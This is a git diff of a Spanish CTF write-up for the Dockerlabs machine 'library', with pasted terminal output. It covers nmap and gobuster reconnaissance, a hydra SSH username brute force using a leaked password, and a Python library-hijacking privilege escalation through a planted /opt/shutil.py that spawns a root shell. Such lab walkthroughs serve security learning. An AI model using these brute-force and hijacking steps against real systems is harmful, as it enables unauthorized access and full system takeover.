@@ -1,28 +1,85 @@
 Resolucion de la maquina library
 
-Despues de levantar la maquina con Docker, se realiza un escaneo con nmap
-![image alt](https://github.com/JOGU-HP/Dockerlabs/blob/1313bacfd784142df57e146e9e3f6267fe19d3b5/maquinas_faciles/library/images/escaneo.png)
+**Despues de levantar la maquina con Docker, se realiza un escaneo con nmap
+└─$ nmap -p- -sS -sC -sV --min-rate 1000 172.17.0.2    
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-10 21:50 -0600
+Nmap scan report for 172.17.0.2
+Host is up (0.0000030s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
+|_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Al ver el puerto 22 y 80 que pertenecen a ssh y http, intuyo que es una pagina web lo que se esta atacando, por lo que busco en el navegador
-<img width="1920" height="1080" alt="Image" src="https://github.com/user-attachments/assets/2a098c36-0ee7-45ea-b608-9e86b1e729cf" />
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.68 seconds
 
-No noto nada extrano en la pagina, por lo que proceso a hacer Fuzzing con gobuster para encontrar directorios ocultos
-<img width="768" height="427" alt="Image" src="https://github.com/user-attachments/assets/575ab6f1-ce5f-4fdd-98c1-439a08d5b913" />
 
-Encuentro un archivo .php, por lo que acceso en el link con la terminacion /index.php y me encuentro con lo que parece ser una credencial
-<img width="1044" height="268" alt="Image" src="https://github.com/user-attachments/assets/2746e7c0-fcbb-4c57-8b72-3f2727a4b4aa" />
+**Al ver el puerto 22 y 80 que pertenecen a ssh y http, intuyo que es una pagina web lo que se esta atacando, por lo que busco en el navegador
 
-La credencial parece ser una contrasena, asi que intento hacer un ataque con hydra, pero como tengo la contrasena, utilizare hydra para enconrar al usuario utilizando el diccionario
+**No noto nada extrano en la pagina, por lo que proceso a hacer Fuzzing con gobuster para encontrar directorios ocultos
+└─$ gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+===============================================================
+Gobuster v3.8
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://172.17.0.2/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 275]
+/.htpasswd            (Status: 403) [Size: 275]
+/.htaccess            (Status: 403) [Size: 275]
+/index.php            (Status: 200) [Size: 26]
+/index.html           (Status: 200) [Size: 10671]
+/javascript           (Status: 301) [Size: 313] [--> http://172.17.0.2/javascript/]
+/server-status        (Status: 403) [Size: 275]
+Progress: 4750 / 4750 (100.00%)
+===============================================================
+Finished
+===============================================================
+                                                                     
+
+**Encuentro un archivo .php, por lo que acceso en el link con la terminacion /index.php y me encuentro con lo que parece ser una credencial
+JIFGHDS87GYDFIGD
+
+**La credencial parece ser una contrasena, asi que intento hacer un ataque con hydra, pero como tengo la contrasena, utilizare hydra para enconrar al usuario utilizando el diccionario
 xato-net-10-million-usernames-dup.txt
-<img width="1016" height="157" alt="Image" src="https://github.com/user-attachments/assets/f0d6a03d-ed22-44f9-9343-4470ca739a82" />
+Escribo el comando:
+└─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -p "JIFGHDS87GYDFIGD" ssh://172.17.0.2 -t 4  
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
-Encuentro al usuario carlos y al ya tener la contrasena, solo realizo una conexion por ssh
-<img width="661" height="298" alt="Image" src="https://github.com/user-attachments/assets/89fb721b-7edd-4123-8471-0a1de37b792b" />
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-10 21:57:14
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 624370 login tries (l:624370/p:1), ~156093 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
 
-Realizo un sudo -l para ver que binarios existen y ejecutar alguno para convertirme en root y se encuentra un script.py que puede ejecutarse para ser root
-<img width="1019" height="124" alt="Image" src="https://github.com/user-attachments/assets/dee7d127-2fc8-4f4c-80b6-d8cd1c61e906" />
+**Encuentro al usuario carlos y al ya tener la contrasena, solo realizo una conexion por ssh
+ssh carlos@172.17.0.2
 
-Con la ayuda de cat se puede ver el script, encontrando la libreria shutil
+
+**Realizo un sudo -l para ver que binarios existen y ejecutar alguno para convertirme en root y se encuentra un script.py que puede ejecutarse para ser root
+
+carlos@bbcbe0624299:~$ sudo -l
+Matching Defaults entries for carlos on bbcbe0624299:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User carlos may run the following commands on bbcbe0624299:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
+
+**Con la ayuda de cat se puede ver el script, encontrando la libreria shutil
   > carlos@786c84f45512:~$ cat /opt/script.py
 --------------------------------------------
 import shutil
@@ -35,11 +92,20 @@ if __name__ == '__main__':
     origen = '/opt/script.py'
     destino = '/tmp/script_backup.py'
 
-Con ello, podemos usar Python Library Hijacking para forzar a python a que ejecute este archivo para convertirnos en root creando un nano e importando la libreria
-<img width="457" height="99" alt="Image" src="https://github.com/user-attachments/assets/2bf3119b-0290-4d57-ae93-b192f4f494d6" />
+**Con ello, podemos usar Python Library Hijacking para forzar a python a que ejecute este archivo para convertirnos en root creando un nano e importando la libreria                                                                                                             
+Escribimos nano /opt/shutil.py
 
-Una vez que se ejcute el codigo nos convertimos en root
-<img width="502" height="104" alt="Image" src="https://github.com/user-attachments/assets/ef55545f-02a7-4f93-9b11-dfb430ec646a" />
+Dentro del archivo en blanco escribir:
 
-Al final si escribimos whoami, veremos que somos root 
-<img width="1920" height="1080" alt="Image" src="https://github.com/user-attachments/assets/7f29ed1c-1e87-4f6d-aeb2-f26d6a76467a" />
+import os
+os.system("sudo /bin/bash")
+
+Guardar el archivo
+
+**Una vez que se ejcute el codigo nos convertimos en root
+Se ejecuta asi:
+sudo /usr/bin/python3 /opt/script.py
+
+**Al final si escribimos whoami, veremos que somos root 
+root@bbcbe0624299:/home/carlos# whoami
+root
